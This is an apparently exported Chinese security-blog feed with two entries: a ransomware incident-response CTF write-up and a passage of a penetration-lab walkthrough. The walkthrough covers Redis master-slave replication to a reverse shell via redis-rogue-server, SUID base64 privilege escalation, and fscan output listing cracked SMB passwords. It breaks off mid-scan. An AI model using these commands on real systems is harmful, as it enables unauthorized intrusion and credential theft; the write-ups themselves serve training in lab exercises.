    <content type="html"><![CDATA[<h1 id="ã€ä»»åŠ¡1ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥"><a href="#ã€ä»»åŠ¡1ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥" class="headerlink" title="ã€ä»»åŠ¡1ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥"></a>ã€ä»»åŠ¡1ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥</h1><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">é¢˜ç›®æè¿°</span><br><span class="language-xml">ä¸Šæœºæ’æŸ¥æäº¤ç—…æ¯’å®¶æ—çš„åç§°ï¼Œå¯è®¿é—®åº”æ€¥å“åº”.comç¡®å®šå®¶æ—åç§°ï¼Œä»¥flag</span><span class="hljs-template-variable">&#123;xxx&#125;</span><span class="language-xml">æäº¤ é¦–å­—æ¯å¤§å†™ã€‚</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/590546cbc2de63cb.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;Live&#125;</span><br></code></pre></td></tr></table></figure><h1 id="ã€ä»»åŠ¡2ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥"><a href="#ã€ä»»åŠ¡2ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥" class="headerlink" title="ã€ä»»åŠ¡2ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥"></a>ã€ä»»åŠ¡2ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥</h1><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">é¢˜ç›®æè¿°</span><br><span class="language-xml">æäº¤å‹’ç´¢ç—…æ¯’é¢„ç•™çš„IDï¼Œä»¥flag</span><span class="hljs-template-variable">&#123;xxxxxx&#125;</span><span class="language-xml">è¿›è¡Œæäº¤</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/8bc0c5f778e92453.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">170605242653</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="ã€ä»»åŠ¡3ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥"><a href="#ã€ä»»åŠ¡3ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥" class="headerlink" title="ã€ä»»åŠ¡3ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥"></a>ã€ä»»åŠ¡3ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥</h1><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">é¢˜ç›®æè¿°</span><br><span class="language-xml">è§£å¯†å¹¶æäº¤æ¡Œé¢ä¸­flag.txt.LIVEçš„flagï¼Œä»¥flag</span><span class="hljs-template-variable">&#123;xxxx&#125;</span><span class="language-xml">æäº¤</span><br></code></pre></td></tr></table></figure><p>LIVE1.0 æ¢å¤å·¥å…·å®˜ç½‘åœ°å€ï¼š<a href="https://www.solarsecurity.cn/tools?page=1&keyword=LIVE">https://www.solarsecurity.cn/tools?page=1&amp;keyword=LIVE</a></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">.\LIVE_Decrypto.exe -<span class="hljs-built_in">path</span> &quot;F:\CTF question\Solar8\tools_files_LIVE_Decrypto\flag.txt.LIVE&quot;<br></code></pre></td></tr></table></figure><p>è§£å¯† flag.txt.LIVE</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">flag&#123;cf<span class="hljs-number">0971</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>d<span class="hljs-number">17</span>a<span class="hljs-number">03823</span><span class="hljs-keyword">c</span><span class="hljs-number">3</span>db<span class="hljs-number">541</span>ea<span class="hljs-number">3</span>b<span class="hljs-number">4</span>ec<span class="hljs-number">2</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="ã€ä»»åŠ¡4ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥"><a href="#ã€ä»»åŠ¡4ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥" class="headerlink" title="ã€ä»»åŠ¡4ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥"></a>ã€ä»»åŠ¡4ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥</h1><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm">é¢˜ç›®æè¿°<br>æäº¤Windows Defenderåˆ é™¤æ”»å‡»è€…<span class="hljs-built_in">C2</span>çš„æ—¶é—´ï¼Œä»¥flag&#123;<span class="hljs-number">2025</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>_1:<span class="hljs-number">10</span>&#125;æ ¼å¼æäº¤<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ Defender å†å²è®°å½•</p><p><img src="https://img.dkdun.cn/v1/2025/12/7f2295445f98eb44.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">2025</span>.<span class="hljs-number">8</span>.<span class="hljs-number">25</span>_10:<span class="hljs-number">43</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="ã€ä»»åŠ¡5ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥"><a href="#ã€ä»»åŠ¡5ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥" class="headerlink" title="ã€ä»»åŠ¡5ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥"></a>ã€ä»»åŠ¡5ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">é¢˜ç›®æè¿°<br>æäº¤æ”»å‡»è€…å…³é—­Windows Defenderçš„æ—¶é—´ï¼Œä»¥flag&#123;<span class="hljs-number">2025.1</span>.<span class="hljs-number">1</span>_1:<span class="hljs-number">10</span>&#125;æ ¼å¼æäº¤<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/2d2038555102cae7.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">2025</span>.<span class="hljs-number">8</span>.<span class="hljs-number">25</span>_10:<span class="hljs-number">45</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="ã€ä»»åŠ¡6ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥"><a href="#ã€ä»»åŠ¡6ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥" class="headerlink" title="ã€ä»»åŠ¡6ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥"></a>ã€ä»»åŠ¡6ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥</h1><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm">é¢˜ç›®æè¿°<br>æäº¤æ”»å‡»è€…ä¸Šä¼ <span class="hljs-built_in">C2</span>çš„ç»å¯¹è·¯å¾„ï¼Œæ ¼å¼ä»¥flag&#123;C:\xxx\xxx&#125;æäº¤<br></code></pre></td></tr></table></figure><p>åœ¨ä¸‹è½½ç›®å½•ä¸­æ‰¾åˆ°å¯ç–‘ç¨‹åº</p><p><img src="https://img.dkdun.cn/v1/2025/12/5279bbb6f5102f17.png"></p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">flag&#123;<span class="hljs-name">C</span>:\Users\Administrator\Downloads\Wq12D.exe&#125;<br></code></pre></td></tr></table></figure><h1 id="ã€ä»»åŠ¡7ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥"><a href="#ã€ä»»åŠ¡7ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥" class="headerlink" title="ã€ä»»åŠ¡7ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥"></a>ã€ä»»åŠ¡7ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥</h1><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gml">é¢˜ç›®æè¿°<br>æäº¤æ”»å‡»è€…C2çš„IPå¤–è”åœ°å€ï¼Œæ ¼å¼ä»¥flag&#123;xx.<span class="hljs-variable language_">x</span>.<span class="hljs-variable language_">x</span>.<span class="hljs-variable language_">x</span>&#125;æäº¤<br></code></pre></td></tr></table></figure><p>æŠŠ Wq12D.exe æ–‡ä»¶ä¸¢è¿›å¾®æ­¥æ²™ç®±æŸ¥çœ‹</p><p><img src="https://img.dkdun.cn/v1/2025/12/5dec5c5343e683cc.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.186.2</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="ã€ä»»åŠ¡8ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥"><a href="#ã€ä»»åŠ¡8ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥" class="headerlink" title="ã€ä»»åŠ¡8ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥"></a>ã€ä»»åŠ¡8ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">é¢˜ç›®æè¿°<br>æäº¤æ”»å‡»è€…åŠ å¯†å™¨ç»å¯¹è·¯å¾„ï¼Œæ ¼å¼ä»¥flag&#123;C:\xxx\xxx&#125;æäº¤<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/23b87ef582312f2a.png"></p><p>æ‰¾åˆ°åŠ å¯†å™¨</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">flag&#123;<span class="hljs-name">C</span>:\Users\Administrator\Documents\systime.exe&#125;<br></code></pre></td></tr></table></figure><h1 id="ã€ä»»åŠ¡9ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥"><a href="#ã€ä»»åŠ¡9ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥" class="headerlink" title="ã€ä»»åŠ¡9ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥"></a>ã€ä»»åŠ¡9ã€‘å‹’ç´¢ç¯å¢ƒæº¯æºæ’æŸ¥</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">é¢˜ç›®æè¿°<br>æº¯æºé»‘å®¢æ”»å‡»è·¯å¾„ï¼Œåˆ©ç”¨çš„å“ªä¸ªæ¼æ´å¹¶æ¨æµ‹éªŒè¯ï¼Œæäº¤èµ·è¿è¡Œæ–‡ä»¶ç»å¯¹è·¯å¾„ï¼Œå¦‚ï¼šflag&#123;C:\xxx\xxx\xxx&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/e1cd573b8125db23.png"></p><figure class="highlight roboconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs roboconf">flag&#123;<span class="hljs-attribute">E</span>:\ruoyi\ruoyi-admin<span class="hljs-variable">.jar</span>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>åº”æ€¥å“åº”&amp;å–è¯</category>
      
    </categories>
    
    
    <tags>
      
      <tag>åº”æ€¥å“åº”</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ˜¥ç§‹äº‘é•œ-Brute4Road</title>
    <link href="/2025/08/13/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road/"/>
    <url>/2025/08/13/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road/</url>
    
    <content type="html"><![CDATA[<p>Redis ä¸»ä»å¤åˆ¶ï¼ŒCVE-2021-25003ï¼Œmssqlï¼ŒS4U ä¼ªé€ </p><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h2><p>æ‰«åˆ°äº†å‡ ä¸ªä¸œè¥¿ï¼Œftp åŒ¿åç™»é™†ï¼ŒRedis æœªæˆæƒè®¿é—®</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">[+] ftp 39.98.116.201:21:anonymous<br>   [-&gt;]pub<br>[+] Redis 39.98.116.201:6379 unauthorized file:/usr/local/redis/db/dump.rdb<br></code></pre></td></tr></table></figure><h1 id="ftp-åŒ¿åç™»é™†"><a href="#ftp-åŒ¿åç™»é™†" class="headerlink" title="ftp åŒ¿åç™»é™†"></a>ftp åŒ¿åç™»é™†</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">ftp 39.98.116.201<br>anonymous:anonymous<br></code></pre></td></tr></table></figure><p>æœ‰ä¸€ä¸ª pub æ–‡ä»¶ç›®å½•ï¼Œä½†é‡Œé¢ä»€ä¹ˆéƒ½æ²¡æœ‰</p><h1 id="Redis-ä¸»ä»å¤åˆ¶-getshell"><a href="#Redis-ä¸»ä»å¤åˆ¶-getshell" class="headerlink" title="Redis ä¸»ä»å¤åˆ¶ getshell"></a>Redis ä¸»ä»å¤åˆ¶ getshell</h1><p>å¼€æ”¾äº† 6379 ç«¯å£ï¼Œè¿æ¥</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">redis-cli -h 39.98.116.201<br></code></pre></td></tr></table></figure><p>å‡†å¤‡å†™è®¡åˆ’ä»»åŠ¡åå¼¹ shellï¼Œä½†æ˜¯æ²¡æœ‰æƒé™</p><p><img src="https://img.dkdun.cn/v1/2025/12/536b5fb4c5de06e6.png"></p><p>åˆ©ç”¨ä¸»ä»å¤åˆ¶è¿›è¡Œ getshellï¼Œ**<a href="https://github.com/n0b0dyCN/redis-rogue-server">redis-rogue-serve</a>**</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">python3 redis-rogue-server.py --rhost 39.98.116.201 --rport 6379 --lhost IP --lport 7788 --exp exp.so<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/809a89981fc93ebb.png"></p><p>åå¼¹ shellï¼Œå»ºç«‹è¿æ¥ï¼Œåœ¨ &#x2F;home&#x2F;redis&#x2F;flag ä¸‹æ‰¾åˆ°äº† flag01ï¼Œä½†æ˜¯æ²¡æœ‰æƒé™è¯»å–</p><p><img src="https://img.dkdun.cn/v1/2025/12/3f25177f27089327.png"></p><p>æŸ¥çœ‹ SUID</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/ef84891118d8012e.png"></p><p>å‘ç°å¯ä»¥ base64 ææƒï¼Œä¸å°å¿ƒé€€å‡ºæ¥äº†ï¼ˆå·²å¸å–æ•™è®­ï¼Œå¥½å¥½åšæƒé™ç»´æŒäº†ï¼‰ï¼Œä¸Šçº¿ vshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">base64</span> <span class="hljs-string">&quot;flag01&quot;</span> | <span class="hljs-built_in">base64</span> --decode<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/5148ca201177c749.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag01</span>: flag&#123;<span class="hljs-number">07221</span>d6f-<span class="hljs-number">5129</span>-<span class="hljs-number">47</span>f0-<span class="hljs-number">85</span>ea-<span class="hljs-number">0</span>c691642d351&#125;<br></code></pre></td></tr></table></figure><h1 id="CVE-2021-25003"><a href="#CVE-2021-25003" class="headerlink" title="CVE-2021-25003"></a>CVE-2021-25003</h1><p>ä¸Šä¼  fscan å’Œ frpï¼Œifconfig çŸ¥é“å†…ç½‘ ip ä¸º 172.22.2.7 </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs sh">[redis@centos-web01 tmp]$ ./FScan_2.0.1_linux_x64 -h 172.22.2.7/24<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚    ___                              _        â”‚<br>â”‚   / _ \     ___  ___ _ __ __ _  ___| | __    â”‚<br>â”‚  / /_\/____/ __|/ __| <span class="hljs-string">&#x27;__/ _` |/ __| |/ /    â”‚</span><br><span class="hljs-string">â”‚ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     â”‚</span><br><span class="hljs-string">â”‚ \____/     |___/\___|_|  \__,_|\___|_|\_\    â”‚</span><br><span class="hljs-string">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br><span class="hljs-string">      Fscan Version: 2.0.1</span><br><span class="hljs-string"></span><br><span class="hljs-string">[1.9s]     å·²é€‰æ‹©æœåŠ¡æ‰«ææ¨¡å¼</span><br><span class="hljs-string">[1.9s]     å¼€å§‹ä¿¡æ¯æ‰«æ</span><br><span class="hljs-string">[1.9s]     CIDRèŒƒå›´: 172.22.2.0-172.22.2.255</span><br><span class="hljs-string">[1.9s]     generate_ip_range_full</span><br><span class="hljs-string">[1.9s]     è§£æCIDR 172.22.2.7/24 -&gt; IPèŒƒå›´ 172.22.2.0-172.22.2.255</span><br><span class="hljs-string">[1.9s]     æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256</span><br><span class="hljs-string">[1.9s]     å¼€å§‹ä¸»æœºæ‰«æ</span><br><span class="hljs-string">[1.9s]     ä½¿ç”¨æœåŠ¡æ’ä»¶: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle</span><br><span class="hljs-string">[1.9s]     æ­£åœ¨å°è¯•æ— ç›‘å¬ICMPæ¢æµ‹...</span><br><span class="hljs-string">[1.9s]     ICMPè¿æ¥å¤±è´¥: dial ip4:icmp 127.0.0.1: socket: operation not permitted</span><br><span class="hljs-string">[1.9s]     å½“å‰ç”¨æˆ·æƒé™ä¸è¶³,æ— æ³•å‘é€ICMPåŒ…</span><br><span class="hljs-string">[1.9s]     åˆ‡æ¢ä¸ºPINGæ–¹å¼æ¢æµ‹...</span><br><span class="hljs-string">[2.9s] [*] ç›®æ ‡ 172.22.2.16     å­˜æ´» (ICMP)</span><br><span class="hljs-string">[3.0s] [*] ç›®æ ‡ 172.22.2.18     å­˜æ´» (ICMP)</span><br><span class="hljs-string">[5.0s] [*] ç›®æ ‡ 172.22.2.3      å­˜æ´» (ICMP)</span><br><span class="hljs-string">[5.0s] [*] ç›®æ ‡ 172.22.2.34     å­˜æ´» (ICMP)</span><br><span class="hljs-string">[6.0s] [*] ç›®æ ‡ 172.22.2.7      å­˜æ´» (ICMP)</span><br><span class="hljs-string">[7.9s]     å­˜æ´»ä¸»æœºæ•°é‡: 5</span><br><span class="hljs-string">[7.9s]     æœ‰æ•ˆç«¯å£æ•°é‡: 233</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.2.16:80</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.2.16:1433</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.2.3:389</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.2.3:445</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.2.3:139</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.2.3:135</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.2.3:88</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.2.16:445</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.2.16:139</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.2.16:135</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.2.18:80</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.2.18:22</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.2.34:445</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.2.34:139</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.2.34:135</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.2.18:139</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.2.18:445</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.2.7:6379</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.2.7:80</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.2.7:22</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.2.7:21</span><br><span class="hljs-string">[10.9s]     æ‰«æå®Œæˆ, å‘ç° 21 ä¸ªå¼€æ”¾ç«¯å£</span><br><span class="hljs-string">[10.9s]     å­˜æ´»ç«¯å£æ•°é‡: 21</span><br><span class="hljs-string">[10.9s]     å¼€å§‹æ¼æ´æ‰«æ</span><br><span class="hljs-string">[11.0s] [*] ç½‘ç«™æ ‡é¢˜ http://172.22.2.7         çŠ¶æ€ç :200 é•¿åº¦:4833   æ ‡é¢˜:Welcome to CentOS</span><br><span class="hljs-string">[11.0s] [+] 172.22.2.34 CVE-2020-0796 SmbGhost Vulnerable</span><br><span class="hljs-string">[11.0s] [*] NetInfo æ‰«æç»“æœ</span><br><span class="hljs-string">ç›®æ ‡ä¸»æœº: 172.22.2.34</span><br><span class="hljs-string">ä¸»æœºå: CLIENT01</span><br><span class="hljs-string">å‘ç°çš„ç½‘ç»œæ¥å£:</span><br><span class="hljs-string">   IPv4åœ°å€:</span><br><span class="hljs-string">      â””â”€ 172.22.2.34</span><br><span class="hljs-string">[11.0s] [*] NetInfo æ‰«æç»“æœ</span><br><span class="hljs-string">ç›®æ ‡ä¸»æœº: 172.22.2.16</span><br><span class="hljs-string">ä¸»æœºå: MSSQLSERVER</span><br><span class="hljs-string">å‘ç°çš„ç½‘ç»œæ¥å£:</span><br><span class="hljs-string">   IPv4åœ°å€:</span><br><span class="hljs-string">      â””â”€ 172.22.2.16</span><br><span class="hljs-string">[11.0s] [*] NetInfo æ‰«æç»“æœ</span><br><span class="hljs-string">ç›®æ ‡ä¸»æœº: 172.22.2.3</span><br><span class="hljs-string">ä¸»æœºå: DC</span><br><span class="hljs-string">å‘ç°çš„ç½‘ç»œæ¥å£:</span><br><span class="hljs-string">   IPv4åœ°å€:</span><br><span class="hljs-string">      â””â”€ 172.22.2.3</span><br><span class="hljs-string">[11.0s] [*] ç½‘ç«™æ ‡é¢˜ http://172.22.2.16        çŠ¶æ€ç :404 é•¿åº¦:315    æ ‡é¢˜:Not Found</span><br><span class="hljs-string">[11.1s] [+] NetBios 172.22.2.34     XIAORANG\CLIENT01             </span><br><span class="hljs-string">[11.1s]     POCåŠ è½½å®Œæˆ: æ€»å…±387ä¸ªï¼ŒæˆåŠŸ387ä¸ªï¼Œå¤±è´¥0ä¸ª</span><br><span class="hljs-string">[11.1s]     ç³»ç»Ÿä¿¡æ¯ 172.22.2.16 [Windows Server 2016 Datacenter 14393]</span><br><span class="hljs-string">[11.1s] [+] NetBios 172.22.2.3      DC:DC.xiaorang.lab               Windows Server 2016 Datacenter 14393</span><br><span class="hljs-string">[11.1s]     ç³»ç»Ÿä¿¡æ¯ 172.22.2.3 [Windows Server 2016 Datacenter 14393]</span><br><span class="hljs-string">[11.1s] [+] NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393</span><br><span class="hljs-string">[11.1s] [+] NetBios 172.22.2.18     WORKGROUP\UBUNTU-WEB02        </span><br><span class="hljs-string">[11.2s] [+] FTPæœåŠ¡ 172.22.2.7:21 åŒ¿åç™»å½•æˆåŠŸ!</span><br><span class="hljs-string">[11.2s] [+] SMBè®¤è¯æˆåŠŸ 172.22.2.18:445 administrator:admin123</span><br><span class="hljs-string">[11.4s]     SMB2å…±äº«ä¿¡æ¯ 172.22.2.18:445 administrator Pass:P@ssword123 å…±äº«:[print$ IPC$]</span><br><span class="hljs-string">[11.6s] [+] 